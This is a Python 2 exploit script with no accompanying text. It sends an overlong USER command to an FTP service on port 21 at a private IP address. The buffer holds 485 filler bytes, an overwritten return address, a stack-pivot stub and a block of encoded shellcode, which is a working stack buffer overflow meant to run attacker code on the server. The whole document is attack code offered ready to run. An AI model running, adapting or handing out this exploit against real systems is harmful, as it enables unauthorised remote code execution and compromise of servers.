#!/usr/bin/python2
import socket
shellcode = ("\xba\xc7\xa8\xbc\x52\xd9\xc0\xd9\x74\x24\xf4\x5e\x31"
"\xc9\xb1\x53\x31\x56\x12\x83\xc6\x04\x03\x91\xa6\x5e"
"\xa7\xe1\x5f\x1c\x48\x19\xa0\x41\xc0\xfc\x91\x41\xb6"
"\x75\x81\x71\xbc\xdb\x2e\xf9\x90\xcf\xa5\x8f\x3c\xe0"
"\x0e\x25\x1b\xcf\x8f\x16\x5f\x4e\x0c\x65\x8c\xb0\x2d"
"\xa6\xc1\xb1\x6a\xdb\x28\xe3\x23\x97\x9f\x13\x47\xed"
"\x23\x98\x1b\xe3\x23\x7d\xeb\x02\x05\xd0\x67\x5d\x85"
"\xd3\xa4\xd5\x8c\xcb\xa9\xd0\x47\x60\x19\xae\x59\xa0"
"\x53\x4f\xf5\x8d\x5b\xa2\x07\xca\x5c\x5d\x72\x22\x9f"
"\xe0\x85\xf1\xdd\x3e\x03\xe1\x46\xb4\xb3\xcd\x77\x19"
"\x25\x86\x74\xd6\x21\xc0\x98\xe9\xe6\x7b\xa4\x62\x09"
"\xab\x2c\x30\x2e\x6f\x74\xe2\x4f\x36\xd0\x45\x6f\x28"
"\xbb\x3a\xd5\x23\x56\x2e\x64\x6e\x3f\x83\x45\x90\xbf"
"\x8b\xde\xe3\x8d\x14\x75\x6b\xbe\xdd\x53\x6c\xc1\xf7"
"\x24\xe2\x3c\xf8\x54\x2b\xfb\xac\x04\x43\x2a\xcd\xce"
"\x93\xd3\x18\x7a\x9b\x72\xf3\x99\x66\xc4\xa3\x1d\xc8"
"\xad\xa9\x91\x37\xcd\xd1\x7b\x50\x66\x2c\x84\x4f\x2b"
"\xb9\x62\x05\xc3\xef\x3d\xb1\x21\xd4\xf5\x26\x59\x3e"
"\xae\xc0\x12\x28\x69\xef\xa2\x7e\xdd\x67\x29\x6d\xd9"
"\x96\x2e\xb8\x49\xcf\xb9\x36\x18\xa2\x58\x46\x31\x54"
"\xf8\xd5\xde\xa4\x77\xc6\x48\xf3\xd0\x38\x81\x91\xcc"
"\x63\x3b\x87\x0c\xf5\x04\x03\xcb\xc6\x8b\x8a\x9e\x73"
"\xa8\x9c\x66\x7b\xf4\xc8\x36\x2a\xa2\xa6\xf0\x84\x04"
"\x10\xab\x7b\xcf\xf4\x2a\xb0\xd0\x82\x32\x9d\xa6\x6a"
"\x82\x48\xff\x95\x2b\x1d\xf7\xee\x51\xbd\xf8\x25\xd2"
"\xcd\xb2\x67\x73\x46\x1b\xf2\xc1\x0b\x9c\x29\x05\x32"
"\x1f\xdb\xf6\xc1\x3f\xae\xf3\x8e\x87\x43\x8e\x9f\x6d"
"\x63\x3d\x9f\xa7")
buffer = "A" * 485 + "\x25\x10\xc2\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.35.147',21))
response = s.recv(1024)
print(response)
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print(response)
s.send('PASS PASSWORD\r\n')
s.close()
